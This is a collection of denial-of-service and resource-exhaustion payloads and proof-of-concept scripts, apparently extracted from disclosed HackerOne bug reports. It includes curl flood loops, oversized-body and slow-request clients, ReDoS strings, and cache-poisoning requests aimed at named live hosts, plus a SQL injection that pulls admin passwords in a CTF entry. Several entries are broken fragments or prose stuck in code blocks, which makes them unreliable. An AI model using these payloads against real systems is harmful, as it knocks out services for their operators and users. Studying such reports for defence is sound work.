# Denial of Service & Resource Exhaustion  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#1066007](https://hackerone.com/reports/1066007)  -  Hacky Holidays CTF Writeup
*critical*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
Content-Type: application/x-www-form-urlencoded
Content-Length: 209
Origin: https://hackyholidays.h1ctf.com

preview_markup=yes{{template:cbdj3_/*grinch*/_header.html}}{{77}}&preview_data={"name":"admin","email":"admin@admin.com","admin":true,"administrator":true,"77":"{{template:38dhs_/*admins_only*/_header.html}}"}
```

## 2. [#1680241](https://hackerone.com/reports/1680241)  -  DoS via Automatic Response Message
*medium*

```bash
$ python2.7 -c "print '{\"notify_props\":{\"auto_responder_active\":\"true\",\"auto_responder_message\":\"' + 'A' * 50000000 + '\"}}'" > payload

$ for ((i = 0; i < 5; i++)); do curl -X PUT "http://<domain>/api/v4/users/me/patch" -H 'Content-Type: application/json' -d @payload --cookie "MMAUTHTOKEN=<token>" -H "X-CSRF-TOKEN: <csrf-token>" &; done;
```

## 3. [#993582](https://hackerone.com/reports/993582)  -  Application DOS via specially crafted payload on 3d.cs.money
*medium*

```http
POST /api/skin/search HTTP/1.1
Host: 3d.cs.money
Content-Type: application/json;charset=utf-8
Content-Length: 32
Origin: https://3d.cs.money
Referer: https://3d.cs.money/item/default
Cookie: __cfduid=d38bfad20d6ec52ba0a6af9014d27a2e81601313370; TEST_GROUP=2; UUID3D=to4nZuWnRSS4A7G; …

{"name":"[Payload here]","item_name":"AK-47"}
```

## 4. [#861170](https://hackerone.com/reports/861170)  -  Attacker with an Old account might still be able to DoS ctf.hacker101.com by sending a Crafted request
*low*

```http
GET /group HTTP/1.1
Host: ctf.hacker101.com
Referer: https://ctf.hacker101.com/group
Cookie: ███████
```

## 5. [#861170](https://hackerone.com/reports/861170)  -  Attacker with an Old account might still be able to DoS ctf.hacker101.com by sending a Crafted request
*low*

```http
GET /group HTTP/1.1
Host: ctf.hacker101.com
Referer: https://ctf.hacker101.com/group
Cookie: ███████

'''
```

## 6. [#2048725](https://hackerone.com/reports/2048725)  -  Circular based introspetion Query leading to single request denial of service and cost consumption and query cost on api.sorare.com/graphql
*medium*

```http
POST /graphql HTTP/2
Host: api.sorare.com
Referer: https://api.sorare.com/graphql/playground
Content-Type: application/json
Origin: https://api.sorare.com
Content-Length: 262

{"operationName":null,"variables":{},"query":"query {\r\n __schema {\r\n   types { \r\n    fields {\r\n      type {\r\n    fields {\r\n      type { \r\n    fields {\r\n      type {\r\n     fields {\r\n     name\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}"}
```

## 7. [#2048725](https://hackerone.com/reports/2048725)  -  Circular based introspetion Query leading to single request denial of service and cost consumption and query cost on api.sorare.com/graphql
*medium*

```http
POST /graphql HTTP/2
Host: api.sorare.com
Referer: https://api.sorare.com/graphql/playground
Content-Type: application/json
Origin: https://api.sorare.com
Content-Length: 262
```

## 8. [#1066007](https://hackerone.com/reports/1066007)  -  Hacky Holidays CTF Writeup
*critical*

```http
POST /evil-quiz HTTP/1.1
Host: hackyholidays.h1ctf.com
Referer: https://hackyholidays.h1ctf.com/evil-quiz
Content-Type: application/x-www-form-urlencoded
Content-Length: 121
Origin: https://hackyholidays.h1ctf.com
Cookie: session=b0e2497adfcffb94cadce208c7aff1c3

name=test'+union+select+9,9,9,9+union+select+username,password,7,7+from+admin+where+password+like+'s3creT%25'#
```

## 9. [#1066007](https://hackerone.com/reports/1066007)  -  Hacky Holidays CTF Writeup
*critical*

```http
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Referer: https://hackyholidays.h1ctf.com/signup-manager/
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
Origin: https://hackyholidays.h1ctf.com

action=signup&username=grinch1337&password=test99&age=9e9&firstname=YYYYYYYYYYYYYYYYY&lastname=YYYYYYYYYYYYYYYYY&admin=true
```

## 10. [#3783438](https://hackerone.com/reports/3783438)  -  CVE-2026-11352: QUIC zero-length UDP datagrams busy-loop
*low*

```bash
bash <<'BASH'
set -euo pipefail

CURL_BIN="${CURL_BIN:-}"
WAIT_SECS="${WAIT_SECS:-30}"
MAX_TIME="${MAX_TIME:-2}"
CONNECT_TIMEOUT="${CONNECT_TIMEOUT:-2}"
ZERO_FLOOD_HELPERS="${ZERO_FLOOD_HELPERS:-64}"

need() {
  command -v "$1" >/dev/null 2>&1 || { echo "$1 is required" >&2; exit 2; }
}

need python3
need cc

pick_curl() {
  local c
  for c in \
    "${CURL_BIN:-}" \
    "$PWD"/build-http3-curl/src/curl \
    "$PWD"/scratch/build-curl-8.20.0-http3/src/curl \
    "$PWD"/build-*/src/curl \
    "$(command -v curl 2>/dev/null || true)"; do
    [ -n "$c" ] || continue
    [ -x "$c" ] || continue
    "$c" -V 2>/dev/null | grep -q 'HTTP3' || continue
    printf '%s\n' "$c"
    return 0
  done
  return 1
}

CURL_BIN="$(pick_curl || true)"
[ -n "$CURL_BIN" ] || {
  echo "No HTTP/3-enabled curl binary found. Set CURL_BIN=/path/to/http3-curl." >&2
  exit 2
}

TMPDIR="$(mktemp -d)"
# … truncated …
```

## 11. [#557154](https://hackerone.com/reports/557154)  -  DoS attack via comment on Issue
*low, $1,000*

```sh
#!/bin/sh
charBlock=$(head -c 50000 /dev/zero | sed -e 's/\x00/\/a/g')
payload='[a]('$charBlock')'

gitlabHost=$1
ProjectURL=$2
targetID=$3
loop=$4

curl=`cat << EOS
curl
  --insecure
  --silent
  --output /dev/null
  ${ProjectURL}/notes?target_id=${targetID}\&target_type=issue
  --header 'Host: ${gitlabHost}'
  --header 'X-CSRF-Token: [PLACEHOLDER]'
  -b '_gitlab_session=[PLACEHOLDER]'
  --data-binary 'note%5Bnoteable_type%5D=Issue&note%5Bnoteable_id%5D=3&note%5Bnote%5D=${payload}&merge_request_diff_head_sha=undefined'
EOS`

for i in `seq ${loop}`
do
    eval ${curl}&
done
```

## 12. [#1085079](https://hackerone.com/reports/1085079)  -  No Limit on Email Subscription
*low*

```http
POST /newsletter/subscriber/new/ HTTP/1.1
Host: demo.openmage.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: https://demo.openmage.org
Referer: https://demo.openmage.org/

email=deyidi6330%401adir.com
```

## 13. [#3788931](https://hackerone.com/reports/3788931)  -  CVE-2026-11586: WS Auto-PONG memory exhaustion
*low*

```bash
CURL_BIN="${CURL_BIN:-./build-codex-h2-nosan/src/curl}" python3 - <<'PY'
import base64, hashlib, os, re, resource, socket, subprocess, threading, time
st = {}

def srv():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 0))
    s.listen(1)
    st["p"] = s.getsockname()[1]

    c, _ = s.accept()
    c.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
    req = b""
    while b"\r\n\r\n" not in req:
        req += c.recv(4096)

    k = re.search(rb"(?im)^Sec-WebSocket-Key:\s*(\S+)", req).group(1)
    a = base64.b64encode(
        hashlib.sha1(k + b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11").digest()
    ).decode()
    c.sendall(
        (
            "HTTP/1.1 101 Switching Protocols\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Accept: {a}\r\n\r\n"
        ).encode()
    )

    f = b"\x89\x00" * 65536
    try:
        while True:
            c.sendall(f)
    except OSError:
        pass

threading.Thread(target=srv, daemon=True).start()
while "p" not in st:
    time.sleep(0.01)
# … truncated …
```

## 14. [#350847](https://hackerone.com/reports/350847)  -  Bypass of request line length limit to DoS via cache poisoning
*medium*

```sh
#!/bin/sh

REPEAT=992
ID=623145
curl --http1.1 -s "https://boards.greenhouse.io/embed/job_board/js?for=a%00`python -c 'print(\"♥\" * '$REPEAT')'`$ID" -v
```

## 15. [#1300802](https://hackerone.com/reports/1300802)  -  Possible DOS in app with crashing `exceptions_app`
*medium*

```ruby
1000.times.each do |n|
  `curl -H "Accept: application/xml" -H "Content-Type: application/xml" -X GET http://localhost:3000///wp1/wp-includes/wlwmanifest.xml`
end
```

## 16. [#1066007](https://hackerone.com/reports/1066007)  -  Hacky Holidays CTF Writeup
*critical*

```
' union select 3,3,'../api/user'
```

## 17. [#880187](https://hackerone.com/reports/880187)  -  Near to Infinite loop when changing Group's name that has API token as Team Member
*medium, $2,500*

```javascript
!function(e) {
    function t(t) {
        for (var n, s, l = t[0], o = t[1], c = t[2], m = 0, d = []; m < l.length; m++)
            s = l[m],
            Object.prototype.hasOwnProperty.call(r, s) && r[s] && d.push(r[s][0]),
            r[s] = 0;
        for (n in o)
            Object.prototype.hasOwnProperty.call(o, n) && (e[n] = o[n]);
        for (u && u(t); d.length; )
            d.shift()();
        return i.push.apply(i, c || []),
        a()
    }
```

## 18. [#125587](https://hackerone.com/reports/125587)  -  Hogging up all the resources on hackerone.com
*medium*

```
for((x=0;x<10;x++)); do (curl https://hackerone.com/reports/NNNNNN.json & ); done
```

## 19. [#255822](https://hackerone.com/reports/255822)  -  WebDAV Empty Property search leads to full CPU usage
*medium*

```bash
curl -i --user testuser:testpass -X PROPFIND -d '<?xml version="1.0"?><a:propfind xmlns:a="DAV:"><a:prop></a:prop></a:propfind>' http://nextcloud/remote.php/webdav
```

## 20. [#661722](https://hackerone.com/reports/661722)  -  WEBrick::HTTPAuth::DigestAuth authentication is vulnerable to regular expression denial of service (ReDoS)
*low*

```sh
$ time curl -I --header 'Authorization: Digest a="\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b' http://localhost:8000
HTTP/1.1 400 Bad Request 
Content-Type: text/html; charset=ISO-8859-1
Server: WEBrick/1.4.2 (Ruby/2.5.5/2019-03-15)
Date: Sat, 27 Jul 2019 05:38:27 GMT
Content-Length: 291
Connection: close


real	0m9.714s
user	0m0.013s
sys	0m0.003s
```

## 21. [#3783438](https://hackerone.com/reports/3783438)  -  CVE-2026-11352: QUIC zero-length UDP datagrams busy-loop
*low*

```
curl_bin=/home/yanzhen/curl/curl/build-http3-curl/src/curl
curl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV OpenSSL/3.5.6 zlib/1.2.11 libpsl/0.21.0 ngtcp2/1.23.0 nghttp3/1.16.0
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt mqtts pop3 pop3s rtsp smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS HSTS HTTP3 HTTPS-proxy IPv6 Largefile libz PSL SSL threadsafe TLS-SRP UnixSockets
url=https://127.0.0.1:50949/
requested_max_time=2
observed_seconds=30
curl_still_running_after_30s=1
curl_exit=killed
PORT=50949
HANDSHAKE_COMPLETED alpn=h3
ZERO_FLOOD_STARTED helper=sendmmsg helpers=64
PEER_STATS sent_datagrams=1106944 send_calls=1081 send_errors=0
PEER_STATS sent_datagrams=1084416 send_calls=1059 send_errors=0
...
VULNERABLE: completed QUIC handshake and then zero-length UDP datagrams kept curl running past --max-time.
```

## 22. [#1596252](https://hackerone.com/reports/1596252)  -  DoS via lua_read_body() [zhbug_httpd_94]
*low*

```bash
curl -v -i -H "Content-Type: multipart/form-data; boundary=badbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadbbadbadbadb" -H "Content-Length: 9223372036854775807" -X POST -k http://127.0.0.1/bug94/bug94.lua
```

## 23. [#1784449](https://hackerone.com/reports/1784449)  -  Regular Expression Denial of Service in Headers
*low*

```js
const { Headers } = require("undici");

console.log("Headers.set()");
for (let i = 0; i <= 5; i++) {
  const headers = new Headers();
  const attack = "a" + "\t".repeat(i * 10_000) + "\ta";
  const start = performance.now();
  headers.set("foo", attack);
  console.log(`${attack.length}: ${performance.now() - start}ms`);
}

console.log("\nHeaders.append()");
for (let i = 0; i <= 5; i++) {
  const headers = new Headers();
  const attack = "a" + "\t".repeat(i * 10_000) + "\ta";
  const start = performance.now();
  headers.append("foo", attack);
  console.log(`${attack.length}: ${performance.now() - start}ms`);
}
```

## 24. [#2591681](https://hackerone.com/reports/2591681)  -  CVE-2024-38875: Denial-Of-Service through uncontrolled resource consumption caused by poor time complexity of strip_punctuation .
*medium, $2,142*

```
# SNIP
    def trim_punctuation(self, word):
        """
        Trim trailing and wrapping punctuation from `word`. Return the items of
        the new state.
        """
        lead, middle, trail = "", word, ""
        # Continue trimming until middle remains unchanged.
        trimmed_something = True
        while trimmed_something: # <--------- This loop has O(n^2) worst case time complexity
            trimmed_something = False
            # Trim wrapping punctuation.
            for opening, closing in self.wrapping_punctuation:
                if middle.startswith(opening):
                    middle = middle.removeprefix(opening)
                    lead += opening
                    trimmed_something = True
                # Keep parentheses at the end only if they're balanced.
                if (
                    middle.endswith(closing)
                    and middle.count(closing) == middle.count(opening) + 1
                ):
                    middle = middle.removesuffix(closing)
                    trail = closing + trail
                    trimmed_something = True
            # Trim trailing punctuation (after trimming wrapping punctuation,
            # as encoded entities contain ';'). Unescape entities to avoid
            # breaking them by removing ';'.
            middle_unescaped = html.unescape(middle)
            stripped = middle_unescaped.rstrip(self.trailing_punctuation_chars)
            if middle_unescaped != stripped:
                punctuation_count = len(middle_unescaped) - len(stripped)
                trail = middle[-punctuation_count:] + trail
                middle = middle[:-punctuation_count]
                trimmed_something = True
# … truncated …
```

## 25. [#1173153](https://hackerone.com/reports/1173153)  -  Cache Poisoning DoS on downloads.exodus.com
*high*

```http
GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1
Host: downloads.exodus.com
Authorization: SharedKeyLite myaccount:ctzMq410TV3wS7upTBcunJTDLEJwMAZuFPfr0mrrA08=
```

## 26. [#1173153](https://hackerone.com/reports/1173153)  -  Cache Poisoning DoS on downloads.exodus.com
*high*

```http
GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1
Host: downloads.exodus.com
Authorization: SharedKeyLite myaccount:ctzMq410TV3wS7upTBcunJTDLEJwMAZuFPfr0mrrA08=  

'''
```

## 27. [#1173153](https://hackerone.com/reports/1173153)  -  Cache Poisoning DoS on downloads.exodus.com
*high*

```http
GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1
Host: downloads.exodus.com

'''
```

## 28. [#1160407](https://hackerone.com/reports/1160407)  -  Cache poisoning Denial of Service affecting assets.gitlab-static.net
*high*

```http
GET /assets/webpack/commons-pages.admin.sessions-pages.groups.omniauth_callbacks-pages.ldap.omniauth_callbacks-pages.omn-c3aaf8c4.3f9d44ba.chunk.js HTTP/1.1
Host: assets.gitlab-static.net
```

## 29. [#1160407](https://hackerone.com/reports/1160407)  -  Cache poisoning Denial of Service affecting assets.gitlab-static.net
*high*

```http
GET /assets/webpack/commons-pages.admin.sessions-pages.groups.omniauth_callbacks-pages.ldap.omniauth_callbacks-pages.omn-c3aaf8c4.3f9d44ba.chunk.js?cb=youstin-xyz HTTP/1.1
Host: assets.gitlab-static.net
x-http-method-override: HEAD
```

## 30. [#1715536](https://hackerone.com/reports/1715536)  -  Deny of service via malicious Content-Type
*high*

```javascript
const fastify = require('fastify')({
  logger: true
})

// Declare a route
fastify.get('/', function (request, reply) {
  reply.send({ hello: 'world' })
})

// Run the server!
fastify.listen({ port: 3000 }, function (err, address) {
  if (err) {
    fastify.log.error(err)
    process.exit(1)
  }
  // Server is now listening on ${address}
})
```

## 31. [#320586](https://hackerone.com/reports/320586)  -  `foreman` is vulnerable to ReDoS in path
*high*

```js
const net = require('net');
const tick = function() {
const client = net.createConnection({ port: 9999 }, () => {
  client.write(`GET http://${Array(81000).join('0')} HTTP/1.1
Host: localhost:9999


"`);
  });
}
setInterval(tick, 1000)
```

## 32. [#3788931](https://hackerone.com/reports/3788931)  -  CVE-2026-11586: WS Auto-PONG memory exhaustion
*low*

```
${CURL_BIN:-./build-codex-h2-nosan/src/curl}
```

## 33. [#583819](https://hackerone.com/reports/583819)  -  cookie injection allow dos attack to periscope.tv
*medium, $560*

```http
get this response
```

## 34. [#507525](https://hackerone.com/reports/507525)  -  DoS attacks utilizing camo.stream.highwebmedia.com
*medium, $400*

```
<?php

ob_end_flush();
header("HTTP/1.1 500 Internal Server Error");
header("Content-Type: image/png");
header("Content-Length: ". 1024 * 1024 * 2);

for($i=0; $i<200; $i++) {
  echo str_pad('hi', 4096, "hiho");
  flush();
  sleep(9);
}
```

## 35. [#1181946](https://hackerone.com/reports/1181946)  -  Static files on HackerOne.com can be made inaccessible through Cache Poisoning attack
*medium*

```http
GET /assets/static/js/8.9572d249.chunk.js?hackerone=poc HTTP/2
Host: hackerone.com
```

## 36. [#1181946](https://hackerone.com/reports/1181946)  -  Static files on HackerOne.com can be made inaccessible through Cache Poisoning attack
*medium*

```http
GET /assets/static/js/8.9572d249.chunk.js?hackerone=poc HTTP/2
Host: hackerone.com

'''
```

## 37. [#1826048](https://hackerone.com/reports/1826048)  -  CVE-2023-23916: HTTP multi-header compression denial of service
*medium*

```http
Patch fixing the problem and new test for the case.

## Impact
```

## 38. [#1680241](https://hackerone.com/reports/1680241)  -  DoS via Automatic Response Message
*medium*

```http
PUT http://localhost:8065/api/v4/users/me/patch
   Content-Type: application/json
   X-CSRF-TOKEN: <csrf-token>
   Cookie: MMAUTHTOKEN=<token>
```

## 39. [#774896](https://hackerone.com/reports/774896)  -  Kubelet resource exhaustion attack via metric label cardinality explosion from unauthenticated requests
*medium*

```bash
NODE_NAME="my-poor-node"
NODE_IP="192.168.1.100"

# Perform random requests from an unauthenticated client
curl --insecure https://${NODE_IP}:10250/foo
curl --insecure https://${NODE_IP}:10250/bar
curl --insecure https://${NODE_IP}:10250/baz

# Run in a dedicated shell to be able to get the metrics
kubectl proxy

# Load metrics from node
# For each path (foo, bar, baz) 16 time series got created
curl http://127.0.0.1:8001/api/v1/nodes/${NODE_NAME}/proxy/metrics 2>&1 | grep 'kubelet_http_requests_total\|kubelet_http_requests_duration_seconds\|kubelet_http_inflight_requests'

# Perform more random requests & see the output of the metrics endpoint to grow.
```

## 40. [#453513](https://hackerone.com/reports/453513)  -  Fix for CVE-2018-12122 can be bypassed via keep-alive requests
*medium*

```http
GET / HTTP/1.1
```

## 41. [#453513](https://hackerone.com/reports/453513)  -  Fix for CVE-2018-12122 can be bypassed via keep-alive requests
*medium*

```http
GET / HTTP/1.1

'''
```

## 42. [#418254](https://hackerone.com/reports/418254)  -  Unrestricted POST request size on roomlogin endpoint
*low, $200*

```http
POST requests to endpoint `/roomlogin/<user>` are not limited in size. While the main website login endpoint correctly limits the size of request, this endpoint does not. This can be a mean to perform a DOS attack.

## Steps To Reproduce:
```

## 43. [#507525](https://hackerone.com/reports/507525)  -  DoS attacks utilizing camo.stream.highwebmedia.com
*medium, $400*

```bash
$ time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/████ --resolve camo.stream.highwebmedia.com:443:██████32 > /dev/null &
```

## 44. [#507525](https://hackerone.com/reports/507525)  -  DoS attacks utilizing camo.stream.highwebmedia.com
*medium, $400*

```bash
$ jobs
[1]   Running                 time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/████ --resolve camo.stream.highwebmedia.com:443:██████32 > /dev/null &
[2]   Running                 time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/██████ --resolve camo.stream.highwebmedia.com:443:██████32 > /dev/null &
[3]   Running                 time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/████ --resolve camo.stream.highwebmedia.com:443:████32 > /dev/null &
...
```

## 45. [#507525](https://hackerone.com/reports/507525)  -  DoS attacks utilizing camo.stream.highwebmedia.com
*medium, $400*

```bash
$ time curl -s https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/██████████ > /dev/null &
```

## 46. [#1000567](https://hackerone.com/reports/1000567)  -  ReDoS at wiki.cs.money graphQL endpoint (AND probably a kind of command injection)
*medium, $250*

```bash
curl 'https://wiki.cs.money/graphql' \  
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' \
  -H 'content-type: application/json' \
  -H 'accept: */*' \     
  --data-binary $'{"query":"query a { \\n  search(q: \\"[a-zA-Z0-9]+\\\\\\\\s?)+$|^([a-zA-Z0-9.\'\\\\\\\\w\\\\\\\\W]+\\\\\\\\s?)+$\\\\\\\\\\", lang: \\"en\\") {\\n    _id\\n   weapon_id\\n    rarity\\n    collection{ _id name }\\n    collection_id \\n \\n }\\n}","variables":null}' \
  --compressed
```

## 47. [#1444501](https://hackerone.com/reports/1444501)  -  URI parser's RFC3986 regular expression has poor performance when there are two # characters, leading to ReDoS
*medium*

```shell
$ ruby -v
ruby 3.1.0p0 (2021-12-25 revision fb4df44d16) [x86_64-linux]
```

## 48. [#1346618](https://hackerone.com/reports/1346618)  -  Web Cache Poisoning leading to DoS
*medium*

```bash
curl https://acquisition-uat.gsa.gov/\?letme\=4447 -H "Host: acquisition-uat.gsa.gov:8888"
```

## 49. [#1685979](https://hackerone.com/reports/1685979)  -  DoS via Playbook
*medium*

```bash
curl -X POST "http://<domain>/plugins/playbooks/api/v0/playbooks" -H 'Content-Type: application/json' -d @payload --cookie "MMAUTHTOKEN=<user-auth-token>" -H "X-CSRF-TOKEN: <csrf-token>"
```

## 50. [#888021](https://hackerone.com/reports/888021)  -  [wappalyzer] ReDoS allows an attacker to completely break Wappalyzer
*high*

```html
<script src='//c.c..j..c.c..j..c.c..j..c.c..j..c.c..j..c.c..j..c.c..j..c.c..j..jskhtlcnipmos.cdnjs.cdnjs.dnjs.cdnjs.cloudflar.jsjs.cloudf'></script>
```

## 51. [#303632](https://hackerone.com/reports/303632)  -  Fastify denial-of-service vulnerability with large JSON payloads
*critical*

```js
const http = require('http');

const req = http.request({
  host: 'localhost',
  port: 3000,
  path: '/',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
}, (res) => {
  console.log(res.statusCode);
  console.log(res.headers);
}).on('error', (err) => {
  console.log(err);
});

const buff = Buffer.alloc(100000);

for (var i = 0; i < 20000; i++) {
  req.write(buff);
}

req.end();
```

## 52. [#1043360](https://hackerone.com/reports/1043360)  -  HTTP2 'unknownProtocol' cause Denial of Service by resource exhaustion
*critical*

```
const http2 = require("http2");
const fs = require("fs");

const port = 50000;

process.on('uncaughtException', error => {
  console.log('An uncaught exception occurred:', error)
});

process.on('unhandledRejection', reason => {
  console.log('An unhandled rejection occurred:', reason)
});

process.on('warning', warning => {
  console.log('A process warning occurred:', warning)
});

function onRequest(req, res) {
  console.log('got request')
}

const serverOptions = {
  key: fs.readFileSync(__dirname + "/key.crt"),
  cert: fs.readFileSync(__dirname + "/cert.crt")
};

http2
  .createSecureServer(serverOptions, onRequest)
  .listen(port, () => {
    console.log("http2 server started on port", port);
  })
  .on('error', (err) => console.log(err))
```

## 53. [#1043360](https://hackerone.com/reports/1043360)  -  HTTP2 'unknownProtocol' cause Denial of Service by resource exhaustion
*critical*

```
ls -l /proc/{PID}/fd | wc -l && ls -l /proc/{PID}/map_files | wc -l
```

## 54. [#3168039](https://hackerone.com/reports/3168039)  -  CVE-2025-5399: WebSocket endless loop
*low*

```bash
$ python3 server.py &
```

## 55. [#3168039](https://hackerone.com/reports/3168039)  -  CVE-2025-5399: WebSocket endless loop
*low*

```c
curl_easy_setopt(curl, CURLOPT_WS_OPTIONS, (long) CURLWS_NOAUTOPONG);
```

## 56. [#3783438](https://hackerone.com/reports/3783438)  -  CVE-2026-11352: QUIC zero-length UDP datagrams busy-loop
*low*

```bash
curl 8.20.0-DEV (Linux) libcurl/8.20.0-DEV OpenSSL/3.5.6 zlib/1.2.11 libpsl/0.21.0 ngtcp2/1.23.0 nghttp3/1.16.0
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt mqtts pop3 pop3s rtsp smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS HSTS HTTP3 HTTPS-proxy IPv6 Largefile libz PSL SSL threadsafe TLS-SRP UnixSockets
```

## 57. [#3788931](https://hackerone.com/reports/3788931)  -  CVE-2026-11586: WS Auto-PONG memory exhaustion
*low*

```bash
curl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV zlib/1.2.11 libpsl/0.21.0 nghttp2/1.40.0
Release-Date: [unreleased]
Protocols: dict file ftp gopher http imap ipfs ipns mqtt pop3 rtsp smtp telnet tftp ws
Features: alt-svc AsynchDNS HTTP2 IPv6 Largefile libz PSL threadsafe UnixSockets
```

## 58. [#3788931](https://hackerone.com/reports/3788931)  -  CVE-2026-11586: WS Auto-PONG memory exhaustion
*low*

```bash
curl: (27) Out of memory
curl rc = 27
```

## 59. [#1096609](https://hackerone.com/reports/1096609)  -  https://themes.shopify.com::: Host header web cache poisoning lead to DoS
*medium, $2,900*

```
; sleep 0;
```

## 60. [#903521](https://hackerone.com/reports/903521)  -  Fastify uses allErrors: true ajv configuration by default which is susceptible to DoS
*medium, $250*

```js
/* Client */

const fetch = require('node-fetch')
const request = body => {
  const json = JSON.stringify(body)
  console.log(`Payload size: ${Math.round(json.length / 1024)} KiB`)
  return fetch('http://127.0.0.1:3000/', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: json
  })
}

const fireRequests = async () => {
  await request({ string: '@'.repeat(90000) })
  await request({ array: Array(20000).fill().map(() => ({x: Math.random().toString(32).slice(2)})) })
}

/* Server */

const fastify = require('fastify')({ logger: true })

const schema = {
  body: {
    type: 'object',
    properties: {
      array: { uniqueItems: true, maxItems: 10 },
      string: { pattern: "^[^/]+@.+#$", maxLength: 20 },
    }
  },
}

fastify.post('/', { schema }, (request, reply) => {
  reply.send({ hello: 'world', body: request.body })
})

fastify.listen(3000, (err, address) => {
  fastify.log.info(`server listening on ${address}`)
# … truncated …
```

## 61. [#2489843](https://hackerone.com/reports/2489843)  -  Crafted smart contract can take 1.5 minutes to execute due to inefficient CODESIZE implementation
*medium*

```sh
wget -q https://download.java.net/java/GA/jdk11/9/GPL/openjdk-11.0.2_linux-x64_bin.tar.gz
tar zxf openjdk-11.0.2_linux-x64_bin.tar.gz
export JAVA_HOME=$(realpath jdk-11.0.2/)
git clone --depth 1 https://github.com/rsksmart/rskj.git
cd rskj/
echo "task testJar(type: Jar) {" >>rskj-core/build.gradle
echo "    from sourceSets.test.output" >>rskj-core/build.gradle
echo "    classifier = 'tests'" >>rskj-core/build.gradle
echo "}" >>rskj-core/build.gradle
echo "assemble.dependsOn(testJar)" >>rskj-core/build.gradle
./configure.sh
# Build rskj
./gradlew assemble
# Construct reproducer
echo """
import co.rsk.config.TestSystemProperties;
import co.rsk.config.VmConfig;
import java.util.HashSet;
import javax.xml.bind.DatatypeConverter;
import org.ethereum.config.blockchain.upgrades.ActivationConfig;
import org.ethereum.config.blockchain.upgrades.ActivationConfigsForTest;
import org.ethereum.core.BlockFactory;
import org.ethereum.core.BlockTxSignatureCache;
import org.ethereum.core.ReceivedTxSignatureCache;
import org.ethereum.vm.*;
import org.ethereum.vm.program.Program;
import org.ethereum.vm.program.invoke.ProgramInvokeMockImpl;

public class Poc {
    public static void main(String[] args) {
        TestSystemProperties config = new TestSystemProperties();
        PrecompiledContracts precompiledContracts = new PrecompiledContracts(config, null, new BlockTxSignatureCache(new ReceivedTxSignatureCache()));
        BlockFactory blockFactory = new BlockFactory(config.getActivationConfig());
        VmConfig vmConfig = config.getVmConfig();
        ProgramInvokeMockImpl invoke = new ProgramInvokeMockImpl();
# … truncated …
```

## 62. [#868834](https://hackerone.com/reports/868834)  -  Denial of Service by resource exhaustion CWE-400 due to unfinished HTTP/1.1 requests
*critical, $250*

```javascript
const { createConnection } = require('net')

let start
let response = ''
let body = ''.padEnd(4096, '123')

const client = createConnection({ port: parseInt(process.argv[2], 10) }, () => {
  start = process.hrtime.bigint()

  // Send all the headers quickly so that server.headersTimeout is not triggered
  client.write('POST / HTTP/1.1\r\n')
  client.write('Content-Type: text/plain\r\n')
  client.write(`Content-Length: ${Buffer.byteLength(body)}\r\n`)
  client.write(`\r\n`)

  // Send the body very slower but in away that the server.timeout is not triggered
  let i = 0
  let interval = setInterval(() => {
    client.write(body[i])
    i++

    // Done sending, end the request
    if (i === body.length) {
      clearInterval(interval)
      client.write(`\r\n\r\n`)
    }
  }, 60000)
})

client.on('data', data => {
  response += data
  client.end()
})

client.on('close', () => {
  const duration = Number(process.hrtime.bigint() - start) / 1e9

  console.log(`Receive the following response (${response.length} bytes) in ${duration.toFixed(3)} s:\n\n`)
  console.log(response)
})
```

## 63. [#868834](https://hackerone.com/reports/868834)  -  Denial of Service by resource exhaustion CWE-400 due to unfinished HTTP/1.1 requests
*critical, $250*

```
${Buffer.byteLength(body)}
```

## 64. [#868834](https://hackerone.com/reports/868834)  -  Denial of Service by resource exhaustion CWE-400 due to unfinished HTTP/1.1 requests
*critical, $250*

```
${response.length}
```

## 65. [#868834](https://hackerone.com/reports/868834)  -  Denial of Service by resource exhaustion CWE-400 due to unfinished HTTP/1.1 requests
*critical, $250*

```
${duration.toFixed(3)}
```

